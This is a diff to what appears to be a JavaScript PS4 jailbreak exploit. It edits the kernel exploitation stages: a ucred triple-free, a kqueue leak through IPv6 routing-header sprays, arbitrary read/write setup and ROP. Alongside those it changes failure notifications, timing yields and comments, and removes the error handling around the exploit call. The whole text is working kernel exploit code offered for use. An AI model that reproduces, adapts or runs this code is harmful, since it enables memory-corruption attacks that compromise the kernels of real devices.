@@ -817,8 +817,7 @@ function cleanup(kill_workers = false) {
   set_rtprio(prev_rtprio);
 
   log('Cleanup completed');
-  log('Jailbreak failed — please reboot your PS4.');
-  utils.notify('Jailbreak failed stage — please reboot your PS4.');
+
 }
 function fill_buffer_64(buf, val, len) {
   if (!buf || buf.eq(0) || len <= 0) {
@@ -1047,18 +1046,18 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
+
   if (!leak_kqueue_safe()) {
-    log('[leak_kqueue_safe] failed, retrying...');
-    yield_to_render(exploit_phase_trigger);
+    utils.notify('<span style="color:red;font-weight:bold;">Leak failed — please reboot your PS4.</span>');
     return;
   }
+
   log(' Exploit Read/Write...');
   log(' Stability by M.ELHOUT...');
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
 
-  // محاولة الدخول لمرحلة R/W
   var ok = true;
   try {
     setup_arbitrary_rw();
@@ -1066,15 +1065,14 @@ function exploit_phase_rw() {
     ok = false;
   }
 
-  // لو فشل قبل ما يوصل للـ R/W الحقيقي
   if (!ok) {
-    utils.notify('Jailbreak failed leak stage — please reboot your PS4.');
+    utils.notify('<span style="color:red;font-weight:bold;">Jailbreak failed — please reboot your PS4.</span>');
     return;
   }
 
-  // نجاح كامل
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
+  utils.notify('سبحان الله وبحمده سبحان الله العظيم ');
 }
 function exploit_phase_jailbreak() {
   jailbreak();
@@ -1580,14 +1578,15 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking ...');
 
-  // نحرر triplets[1] عشان نستخدمه في التسريب
+  // Free triplet[1] for reclaim
   free_rthdr(ipv6_socks[triplets[1]]);
 
   var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
+
   var count = 0;
-  var MAX_KQ = 3500;
+  var MAX_KQ = 3000;   // أسرع + متناغم مع باقي الفازات
 
   while (count < MAX_KQ) {
     count++;
@@ -1598,15 +1597,21 @@ function leak_kqueue() {
       return false;
     }
 
-    // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
+    // Clear old data
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
+    // Small timing balance
+    sched_yield();
+    nanosleep_fun(1);
+
+    // Leak
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
     var magic = read64(magic_add);
     var fdp   = read64(leak_rthdr.add(0x98));
 
+    // Success condition
     if (magic.eq(magic_val) && !fdp.eq(0)) {
       break;
     }
@@ -1632,12 +1637,11 @@ function leak_kqueue() {
 
   close(kq);
 
-  // إعادة بناء triplets[1] بعد ما استخدمناه في free
+  // Rebuild triplet[1]
   triplets[1] = find_triplet(triplets[0], triplets[2]);
 
   return true;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
@@ -2430,12 +2434,5 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     loop_size: 0 // loop_size
   };
 }
-try {
-  netctrl_exploit();
-} catch (e) {
-  log('ERROR in netctrl_exploit: ' + e.message);
-  cleanup(true);
-  if (typeof show_fail === 'function') {
-    show_fail();
-  }
-}
+netctrl_exploit();
+// cleanup();
